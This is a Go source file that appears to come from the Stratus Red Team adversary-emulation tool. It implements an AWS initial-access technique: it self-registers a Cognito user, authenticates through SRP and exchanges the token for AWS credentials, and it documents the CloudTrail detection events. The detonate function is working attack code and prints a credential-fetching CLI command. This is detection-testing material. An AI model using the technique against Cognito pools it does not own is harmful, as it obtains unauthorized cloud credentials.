package aws

import (
	"context"
	_ "embed"
	"errors"
	"fmt"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/cognitoidentity"
	"github.com/aws/aws-sdk-go-v2/service/cognitoidentityprovider"
	cognitotypes "github.com/aws/aws-sdk-go-v2/service/cognitoidentityprovider/types"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/log"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.initial-access.cognito-self-signup",
		FriendlyName: "Register an Attacker-Controlled Cognito User and Obtain AWS Credentials",
		Platform:     stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{
			mitreattack.InitialAccess,
		},
		FrameworkMappings: []stratus.FrameworkMappings{
			{
				Framework: stratus.ThreatTechniqueCatalogAWS,
				Techniques: []stratus.TechniqueMapping{
					{
						Name: "Valid Accounts: Cloud Accounts",
						ID:   "T1078.004",
						URL:  "https://aws-samples.github.io/threat-technique-catalog-for-aws/Techniques/T1078.004.html",
					},
				},
			},
		},
		Description: `
Self-registers a user in a public Amazon Cognito user pool, then exchanges the resulting
identity for AWS credentials through the associated Cognito identity pool.

Cognito user pools that allow self sign-up, combined with an identity pool that federates
authenticated users into an IAM role, let anyone on the internet obtain valid AWS
credentials for the target account. In this
technique the authenticated role has no permissions.

Warm-up:

- Create a Cognito user pool with a pre-sign-up Lambda trigger that auto-confirms new users (so no email/SMS confirmation is required).
- Create a public app client allowing the SRP authentication flow.
- Create a Cognito identity pool federating authenticated user pool users into an IAM role that has no permissions.

Detonation:

- Self-register a new user in the user pool (<code>SignUp</code>).
- Authenticate using the SRP flow (<code>InitiateAuth</code> then <code>RespondToAuthChallenge</code>).
- Exchange the resulting ID token for AWS credentials (<code>GetId</code> then <code>GetCredentialsForIdentity</code>).

References:

- https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/
- https://hackingthe.cloud/aws/exploitation/cognito_user_self_signup/
- https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/vulnerable_cognito
`,
		Detection: `
You can ientify the self-registration and credential exchange in CloudTrail. A typical detonation
produces the following sequence of events, all from the same source IP and (unauthenticated)
caller:

<ul>
<li><code>SignUp</code> (<code>eventSource: cognito-idp.amazonaws.com</code>): a new user registering in the pool.</li>
<li><code>InitiateAuth</code> followed by <code>RespondToAuthChallenge</code>: the SRP authentication handshake.</li>
<li><code>GetCredentialsForIdentity</code> (<code>eventSource: cognito-identity.amazonaws.com</code>): the exchange of the user pool token for AWS credentials. Note that this is a data event that needs to be enabled separately (see <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/logging-using-cloudtrail.html">here</a>).</li>
</ul>
`,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               true, // re-running registers nothing new; an existing user is reused
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	awsConfig := providers.AWS().GetConnection()
	idpClient := cognitoidentityprovider.NewFromConfig(awsConfig)
	identityClient := cognitoidentity.NewFromConfig(awsConfig)

	userPoolId := params["user_pool_id"]
	clientId := params["client_id"]
	identityPoolId := params["identity_pool_id"]
	shortId := params["warmup_short_id"]
	region := awsConfig.Region

	username := "stratus-user-" + shortId
	password := "Stratus-" + shortId + "-1!"

	ctx := context.Background()

	log.Println("Self-registering user " + username + " in Cognito user pool " + userPoolId)
	_, err := idpClient.SignUp(ctx, &cognitoidentityprovider.SignUpInput{
		ClientId: aws.String(clientId),
		Username: aws.String(username),
		Password: aws.String(password),
	})
	if err != nil {
		var alreadyExists *cognitotypes.UsernameExistsException
		if errors.As(err, &alreadyExists) {
			log.Println("User already registered from a previous detonation, reusing it")
		} else {
			return fmt.Errorf("failed to self-register user: %w", err)
		}
	}

	idToken, err := authenticate(ctx, idpClient, userPoolId, clientId, username, password)
	if err != nil {
		return err
	}

	providerName := fmt.Sprintf("cognito-idp.%s.amazonaws.com/%s", region, userPoolId)
	logins := map[string]string{providerName: idToken}

	log.Println("Exchanging the authenticated identity for AWS credentials")
	getIdResult, err := identityClient.GetId(ctx, &cognitoidentity.GetIdInput{
		IdentityPoolId: aws.String(identityPoolId),
		Logins:         logins,
	})
	if err != nil {
		return fmt.Errorf("failed to get a Cognito identity ID: %w", err)
	}

	_, err = identityClient.GetCredentialsForIdentity(ctx, &cognitoidentity.GetCredentialsForIdentityInput{
		IdentityId: getIdResult.IdentityId,
		Logins:     logins,
	})
	if err != nil {
		return fmt.Errorf("failed to get AWS credentials for the Cognito identity: %w", err)
	}

	identityId := aws.ToString(getIdResult.IdentityId)
	log.Println("Successfully exchanged the Cognito identity " + identityId + " for AWS credentials of the identity pool's authenticated IAM role")
	log.Println("To run the Cognito-to-AWS credential exchange yourself and obtain usable credentials, copy and run the following command:")
	fmt.Printf("\n\taws cognito-identity get-credentials-for-identity --identity-id %s --logins '%s=%s' --no-sign-request --region %s\n\n",
		identityId, providerName, idToken, region)
	log.Println("The returned credentials let you act as the authenticated role (e.g. 'aws sts get-caller-identity'). In this technique the role has no permissions, so most other calls are denied.")

	return nil
}

// authenticate performs the Cognito SRP authentication flow (USER_SRP_AUTH) and returns the
// resulting ID token. This emits the InitiateAuth -> RespondToAuthChallenge call sequence.
func authenticate(ctx context.Context, idpClient *cognitoidentityprovider.Client, userPoolId, clientId, username, password string) (string, error) {
	srpClient, err := utils.NewCognitoSrpClient(userPoolId)
	if err != nil {
		return "", err
	}

	log.Println("Authenticating as " + username + " using the SRP flow")
	initiateResult, err := idpClient.InitiateAuth(ctx, &cognitoidentityprovider.InitiateAuthInput{
		AuthFlow:       cognitotypes.AuthFlowTypeUserSrpAuth,
		ClientId:       aws.String(clientId),
		AuthParameters: srpClient.InitiateAuthParameters(username),
	})
	if err != nil {
		return "", fmt.Errorf("failed to initiate authentication: %w", err)
	}

	if initiateResult.ChallengeName != cognitotypes.ChallengeNameTypePasswordVerifier {
		return "", fmt.Errorf("expected a PASSWORD_VERIFIER challenge but got %q", initiateResult.ChallengeName)
	}

	challengeResponses, err := srpClient.PasswordVerifierChallengeResponses(initiateResult.ChallengeParameters, password)
	if err != nil {
		return "", err
	}

	respondResult, err := idpClient.RespondToAuthChallenge(ctx, &cognitoidentityprovider.RespondToAuthChallengeInput{
		ClientId:           aws.String(clientId),
		ChallengeName:      cognitotypes.ChallengeNameTypePasswordVerifier,
		ChallengeResponses: challengeResponses,
	})
	if err != nil {
		return "", fmt.Errorf("failed to respond to the password verifier challenge: %w", err)
	}

	if respondResult.AuthenticationResult == nil || respondResult.AuthenticationResult.IdToken == nil {
		return "", errors.New("authentication did not return an ID token")
	}

	return *respondResult.AuthenticationResult.IdToken, nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	idpClient := cognitoidentityprovider.NewFromConfig(providers.AWS().GetConnection())
	userPoolId := params["user_pool_id"]
	username := "stratus-user-" + params["warmup_short_id"]

	log.Println("Removing the self-registered user " + username + " from the Cognito user pool")
	_, err := idpClient.AdminDeleteUser(context.Background(), &cognitoidentityprovider.AdminDeleteUserInput{
		UserPoolId: aws.String(userPoolId),
		Username:   aws.String(username),
	})
	if err != nil {
		var notFound *cognitotypes.UserNotFoundException
		if errors.As(err, &notFound) {
			return nil
		}
		return fmt.Errorf("failed to delete the self-registered user: %w", err)
	}

	return nil
}
